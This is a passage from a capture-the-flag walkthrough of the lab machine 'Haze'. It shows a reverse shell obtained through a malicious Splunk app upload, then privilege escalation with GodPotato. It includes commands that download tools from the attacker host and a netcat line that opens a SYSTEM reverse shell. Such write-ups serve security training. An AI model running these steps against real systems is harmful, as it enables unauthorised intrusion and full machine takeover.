oxdf@hacky$ mv 0xdf.tgz 0xdf.spl

```

#### Shell

Under Apps > Manage Apps, there’s an option at the top right to “Install app from file”, which presents a form:

![image-20250624170929265](/img/image-20250624170929265.png)

I’ll give it `0xdf.spl`, and it uploads. Within a few seconds, I’ll get a reverse shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.61 62093

PS C:\Windows\system32> whoami
haze\alexander.green

```

## Shell as System

### Enumeration

My session as alexander.green has `SeImpresonatePrivilege`:

```

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

That should be enough to get system.

### GodPotato

#### POC

I’ll grab the latest release of [GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) (NET4 version) and save it to my host, and host it with a Python webserver. I’ll fetch it to Haze:

```

PS C:\programdata> iwr http://10.10.14.6/GodPotato-NET4.exe -outfile GodPotato-NET4.exe

```

As a quick test, I’ll run it with the example command:

```

PS C:\programdata> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140728269471744
[*] DispatchTable: 0x140728272062792
[*] UseProtseqFunction: 0x140728271354688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\2f3dba63-0053-4f1d-a4c1-1da79f12d463\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a002-0b58-ffff-4738-e8e098b1679b
[*] DCOM obj OXID: 0x9ffda463d83c804d
[*] DCOM obj OID: 0x7573302bfedf2859
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 932 Token:0x764  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1648

```

It runs as SYSTEM!

#### Shell

I’ll upload `nc64.exe` to Haze and use it to get a shell:

```

PS C:\programdata> iwr http://10.10.14.6/nc64.exe -outfile nc64.exe
PS C:\programdata> .\GodPotato-NET4.exe -cmd "C:\programdata\nc64.exe 10.10.14.6 444 -e cmd.exe"

```

This time it just hangs, but at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.61 55644
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

I’m able to grab the flag:

```

C:\Users\Administrator\Desktop>type root.txt
e5e0e5dd************************

```